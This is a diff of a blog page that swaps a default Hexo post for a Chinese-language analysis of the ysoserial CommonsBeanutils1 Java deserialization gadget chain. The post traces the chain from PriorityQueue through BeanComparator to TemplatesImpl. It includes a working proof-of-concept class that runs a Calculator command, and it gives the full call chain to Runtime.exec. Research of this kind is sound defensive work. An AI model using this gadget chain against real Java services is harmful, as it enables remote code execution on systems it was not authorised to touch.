@@ -11,7 +11,7 @@
   
   <title>
     
-      Hello World 
+      CommonsBeanutils链分析 
       
       
       |
@@ -124,19 +124,19 @@ MathJax = {
   <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
   <div class="container post-details" id="post-details">
     <div class="post-content">
-      <div class="post-title">Hello World</div>
+      <div class="post-title">CommonsBeanutils链分析</div>
       <div class="post-attach">
         <span class="post-pubtime">
           <i class="iconfont icon-updatetime" title="Update time"></i>
-          2021-01-17 18:46:48
+          2021-01-18 12:55:11
         </span>
         
               <span class="post-categories">
                 <i class="iconfont icon-bookmark" title="Categories"></i>
                 
                 <span class="span--category">
-                  <a href="/categories/HelloWorld/" title="HelloWorld">
-                    <b>#</b> HelloWorld
+                  <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                    <b>#</b> JAVA安全
                   </a>
                 </span>
                 
@@ -146,14 +146,20 @@ MathJax = {
                 <i class="iconfont icon-tags" title="Tags"></i>
                 
                 <span class="span--tag">
-                  <a href="/tags/hexo/" title="hexo">
-                    <b>#</b> hexo
+                  <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                    <b>#</b> JAVA安全
                   </a>
                 </span>
                 
                 <span class="span--tag">
-                  <a href="/tags/%E5%8D%9A%E5%AE%A2/" title="博客">
-                    <b>#</b> 博客
+                  <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化">
+                    <b>#</b> 反序列化
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/CommonsBeanutilsa/" title="CommonsBeanutilså">
+                    <b>#</b> CommonsBeanutilså
                   </a>
                 </span>
                 
@@ -161,22 +167,55 @@ MathJax = {
           
       </div>
       <div class="markdown-body">
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+        <p>先看 ysoserial 中 CommonsBeanutils1 这条链的代码</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonsBeanutils%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210118140118311.png" alt="image-20210118140118311"></p>
+<p>最后返回的是 <code>PriorityQueue&lt;Object&gt; queue</code> ,看一下 PriorityQueue 这个类的定义。</p>
+<p>PriorityQueue类在Java1.5中引入并作为 <a target="_blank" rel="noopener" href="http://www.journaldev.com/1260/java-collections-framework-tutorial">Java Collections Framework</a> 的一部分。PriorityQueue是基于优先堆的一个无界队列，这个优先队列中的元素可以默认自然排序或者通过提供的<a target="_blank" rel="noopener" href="http://www.journaldev.com/780/java-comparable-and-comparator-example-to-sort-objects">Comparator</a>（比较器）在队列实例化的时排序。</p>
+<p>简单来说就是 PriorityQueue 会对队列中的元素用比较器 Comparator 进行排序，而 CommonsBeanutils1 中使用的比较器为 BeanComparator。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">final BeanComparator comparator &#x3D; new BeanComparator(&quot;lowestSetBit&quot;);</span><br><span class="line">...</span><br><span class="line">Reflections.setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);</span><br></pre></td></tr></table></figure>
+<p><strong><em>这里先放一放</em></strong>，我们看看  PriorityQueue 是如何反序列化的，</p>
+<p>直接看 PriorityQueue#readObject() 方法的代码，前边就是将队列中的对象反序列化，最后会调用 PriorityQueue#heapify() 方法。</p>
+<p><em>java.uti.PriorityQueue.java</em></p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonsBeanutils%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210118141333973.png" alt="image-20210118141333973"></p>
+<p>跟进 PriorityQueue#heapify() 方法，这里应该就是排序的代码，遍历队列中的元素传入 PriorityQueue#siftDown() 方法</p>
+<p><em>java.uti.PriorityQueue.java</em></p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonsBeanutils%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210118141725380.png" alt="image-20210118141725380"></p>
+<p> PriorityQueue#siftDown()</p>
+<p><em>java.uti.PriorityQueue.java</em></p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonsBeanutils%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210118142349991.png" alt="image-20210118142349991"></p>
+<p> PriorityQueue#siftDownUsingComparator()</p>
+<p><em>java.uti.PriorityQueue.java</em></p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonsBeanutils%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210118142445779.png" alt="image-20210118142445779"></p>
+<p>一路跟到  PriorityQueue#siftDownUsingComparator() 方法，这里就调用了比较器  comparator 的 compare 方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue#readObject() -&gt; PriorityQueue#heapify() -&gt; PriorityQueue#siftDown() -&gt; PriorityQueue#siftDownUsingComparator() -&gt;  comparator.compare()</span><br></pre></td></tr></table></figure>
+<p><strong><em>总结一下</em></strong>就是 PriorityQueue 反序列化的时候会对队列中的元素使用比较器的 compare 方法即 comparator.compare() 去处理。</p>
+<p>而之前说到 CommonsBeanutils1 链中使用的比较器为 BeanComparator。我们来看  BeanComparator 中的 compare() 方法。</p>
+<p>BeanComparator#compare()</p>
+<p><em>org.apache.commons.beanutils.BeanComparator.class</em></p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonsBeanutils%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210118143341316.png" alt="image-20210118143341316"></p>
+<p>在 BeanComparator#compare() 中使用了 PropertyUtils.getProperty() 去处理传入的对象</p>
+<p>PropertyUtils.getProperty() 是干嘛的？</p>
+<p> 一般情况下，在<a target="_blank" rel="noopener" href="http://lib.csdn.net/base/17">Java</a>中你可以通过get方法轻松获取beans中的属性值。但是，当你事先不知道 <em>beans</em> 的类型或者将要访问或修改的属性名时，该怎么办？Java语言中提供了一些像<code>java.beans.Introspector</code>这 样类，实现了在运行时检测Java类并确定属性get和set方法的名称，结合Java中的反射机制就可以调用这些方法了。然而，这些APIs使用起来比 较困难，并且将Java类中一些不必要的底层结构暴露给了开发人员。BeanUtils包中的APIs试图简化动态获取和设置bean属性的过程。</p>
+<p>而 getProperty() 的定义如下：</p>
+<p><code>PropertyUtils.getProperty(Object bean, String name)</code><br><code>bean</code> 是不为null的Java Bean实例<br><code>name</code> 是Java Bean属性名称 (也就是方法中的getXxx(), setXxx(), 其中的xxx成为这个java bean的bean属性, java中的类成员变量称为字段, 并不是属性。<br>这个方法是调用bean对象中, 中的getname()方法</p>
+<p>简单来说就是PropertyUtils.getProperty() 有两个参数 Object、String，比如传入 User() 和 “xxx”，PropertyUtils.getProperty(new User(),”xxx”)  就相当于调用了 User.getxxx() 方法。</p>
+<p>在 BeanComparator#compare()  中 o1、o2 就是队列中的元素，this.property 也是可控的。这就相当于我们能够调用任意类中的 getter 方法即以 get 开头且没有参数的方法。</p>
+<p><strong><em>到这我们总结一下</em></strong>，通过定义一个 PriorityQueue 队列，并且设置比较器为我们构造好的 BeanComparator 比较器，就可以执行队列中元素的任意 getter 方法。</p>
+<p>所以我们只需要找到一个包含能触发危险敏感操作的 getter 方法的可序列化类即可，ysoserial 中 CommonsBeanutils1 使用的是  <strong>TemplatesImpl</strong> 类(com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl)</p>
+<p>TemplatesImpl 类可以加载自定义的字节码并实例化，从而可执行任意 Java 代码.并且它的入口函数为 TemplatesImpl#getOutputProperties() ，具体可以看 <a target="_blank" rel="noopener" href="https://blog.weik1.top/2021/01/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/#%E5%88%A9%E7%94%A8-TemplatesImpl-%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81">https://blog.weik1.top/2021/01/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/#%E5%88%A9%E7%94%A8-TemplatesImpl-%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81</a></p>
+<p>写代码复现一下这个过程</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> payload;</span><br><span class="line"><span class="keyword">import</span> java.math.BigInteger;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsBeanutils1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 直接用ysoserial 的 Gadgets.createTemplatesImpl创建一个恶意 templates 类</span></span><br><span class="line">        String args1 = <span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(args1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化一个 BeanComparator 比较器</span></span><br><span class="line">        <span class="keyword">final</span> BeanComparator comparator = <span class="keyword">new</span> BeanComparator(<span class="string">&quot;lowestSetBit&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置BeanComparator 比较器的 property 属性为 outputProperties，因为最后需要执行 TemplatesImpl 的 getOutputProperties()方法</span></span><br><span class="line">        Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实例化 PriorityQueue 队列，并且设置比较器为前边定义的 BeanComparator comparator</span></span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将定义的恶意 TemplatesImpl 类对象添加到队列, 需要触发比较所以添加两个</span></span><br><span class="line">        queue.add(templates);</span><br><span class="line">        queue.add(templates);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>成功执行命令</p>
+<p><img src="https://weik1.oss-cn-beijing.aliyuncs.com/Blog_images/CommonsBeanutils%E9%93%BE%E5%88%86%E6%9E%90.assets/image-20210118152705398.png" alt="image-20210118152705398"></p>
+<p>前边说的 PriorityQueue 反序列化的时候会对队列中的元素使用比较器的 compare 方法，所以效果也是一样的，反序列化时的调用链：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">	PriorityQueue.heapify()</span><br><span class="line">		PriorityQueue.siftDown()</span><br><span class="line">			siftDownUsingComparator()</span><br><span class="line">				BeanComparator.compare()</span><br><span class="line">					TemplatesImpl.getOutputProperties()</span><br><span class="line">						TemplatesImpl.newTransformer()</span><br><span class="line">							TemplatesImpl.getTransletInstance()</span><br><span class="line">								TemplatesImpl.defineTransletClasses()</span><br><span class="line">									TemplatesImpl.TransletClassLoader.defineClass()</span><br><span class="line">										Pwner*(Javassist-generated).&lt;static init&gt;</span><br><span class="line">											Runtime.exec()</span><br></pre></td></tr></table></figure>
 
       </div>
       
         <div class="prev-or-next">
           <div class="post-foot-next">
             
-              <a href="/2021/01/15/TemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE/" target="_self">
+              <a href="/2021/01/17/hello-world/" target="_self">
                 <i class="iconfont icon-chevronleft"></i>
                 <span>Prev</span>
               </a>
@@ -185,15 +224,15 @@ MathJax = {
           <div class="post-attach">
             <span class="post-pubtime">
               <i class="iconfont icon-updatetime" title="Update time"></i>
-              2021-01-17 18:46:48
+              2021-01-18 12:55:11
             </span>
             
                   <span class="post-categories">
                     <i class="iconfont icon-bookmark" title="Categories"></i>
                     
                     <span class="span--category">
-                      <a href="/categories/HelloWorld/" title="HelloWorld">
-                        <b>#</b> HelloWorld
+                      <a href="/categories/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                        <b>#</b> JAVA安全
                       </a>
                     </span>
                     
@@ -203,14 +242,20 @@ MathJax = {
                     <i class="iconfont icon-tags" title="Tags"></i>
                     
                     <span class="span--tag">
-                      <a href="/tags/hexo/" title="hexo">
-                        <b>#</b> hexo
+                      <a href="/tags/JAVA%E5%AE%89%E5%85%A8/" title="JAVA安全">
+                        <b>#</b> JAVA安全
                       </a>
                     </span>
                     
                     <span class="span--tag">
-                      <a href="/tags/%E5%8D%9A%E5%AE%A2/" title="博客">
-                        <b>#</b> 博客
+                      <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="反序列化">
+                        <b>#</b> 反序列化
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/CommonsBeanutilsa/" title="CommonsBeanutilså">
+                        <b>#</b> CommonsBeanutilså
                       </a>
                     </span>
                     
@@ -219,28 +264,11 @@ MathJax = {
           </div>
           <div class="post-foot-prev">
             
-              <a href="/2021/01/18/CommonsBeanutils%E9%93%BE%E5%88%86%E6%9E%90/" target="_self">
-                <span>Next</span>
-                <i class="iconfont icon-chevronright"></i>
-              </a>
-            
           </div>
         </div>
       
     </div>
     
-  <div class="post-catalog" id="catalog">
-    <div class="title">Contents</div>
-    <div class="catalog-content">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Quick-Start"><span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-new-post"><span class="toc-text">Create a new post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Run-server"><span class="toc-text">Run server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Generate-static-files"><span class="toc-text">Generate static files</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Deploy-to-remote-sites"><span class="toc-text">Deploy to remote sites</span></a></li></ol></li></ol>
-    </div>
-  </div>
-
-  
-<script src="/js/catalog.js"></script>
-
-
-
 
     
       <div class="comments-container">
